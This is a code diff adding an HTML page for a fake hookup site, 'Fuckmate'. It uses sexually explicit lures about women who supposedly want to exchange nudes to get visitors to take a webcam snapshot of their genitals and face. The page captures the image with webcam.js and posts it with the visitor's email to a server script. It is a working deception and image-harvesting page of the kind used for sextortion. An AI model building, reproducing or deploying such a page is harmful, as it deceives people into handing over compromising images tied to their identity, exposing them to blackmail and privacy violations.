@@ -1,0 +1,122 @@
+
+<div class="FuckMate"> <h1> </h1> 
+<title> Fuckmate </title>
+
+
+<h1>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: white; ">&nbsp; &nbsp;<span style="color: white;">Welcome to Fuckmate</span></span></h1>
+<h1><span style="color: white">Hookup fast with beautiful girls for free. Scroll down to see the girls that will be contacting you they are beautiful. They just want to see that big cock and send you thier pics to your email. </span></h1>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+All Of These girls wanna send you there Nudes but they want to see that big cock first:
+<br>
+<br>
+<br>
+<img SRC= "courtney.jpg">
+<br>
+ Wanna see more of Courtney. Snap a picture of your big cock and beautiful face for me. So I can send you more pics of my body to your email. 
+<br>
+<img SRC= "valerie.jpg"> 
+<br>
+Wanna see more of valerie. Snap a picture of your big cock and that beautiful face for me.So I can send you more pics of my body to your email. 
+<br>
+<img SRC= "lol.jfif"> 
+<br>
+<br>
+Wanna see more of autumn. Snap a picture of your big cock and that beautiful face for me. So I can send you more pics of my body to your email.
+<br>
+<br>
+
+<img SRC= "baddie.jfif"> 
+<br>
+<br>
+Wanna see more of Emily. Snap a picture of your big cock and that beautiful face for me. So I can send you more pics of my body to your email.
+
+
+ </div>
+<html>
+<head>
+    <LINK rel=stylesheet type="text/css" href="lol.css">
+	
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css" />
+	    
+    <style type="text/css">
+        #results { padding:5px; }
+    </style>
+</head>
+<body>
+<div class="girl"><div>
+  
+<div class="container">
+
+   
+   
+    <form method="POST" action="lol.php">
+	
+
+        <div class="row">
+            <div class="button">
+                <div id="my_camera"></div>
+				
+                
+                <input type=button value="Take Snapshot" Onclick="take_snapshot()">
+                <input type="hidden" name="image" class="image-tag">
+				
+            </div>
+            <div class="img">
+			
+                <div id="results"> </div>
+				
+				
+            </div>
+            <div class="cam">
+                <br>
+				<br>
+			
+			Email<input type="text" placeholder="Email" name="abc">
+				 <br>
+				 <br>
+<button class="btn btn-success">Submit</button>
+            </div>
+        </div>
+    </form>
+</div>
+<br>
+<br>
+<br>
+  
+<!-- Configure a few settings and attach camera -->
+<script language="JavaScript">
+    Webcam.set({
+        width: 200,
+        height: 200,
+        image_format: 'jpeg',
+        jpeg_quality: 100,
+    });
+  
+    Webcam.attach( '#my_camera' );
+  
+    function take_snapshot() {
+        Webcam.snap( function(data_uri) {
+            $(".image-tag").val(data_uri);
+            document.getElementById('results').innerHTML = '<img src="'+data_uri+'"/>';
+        } );
+    }
+</script>
+ 
+</body>
+</html>
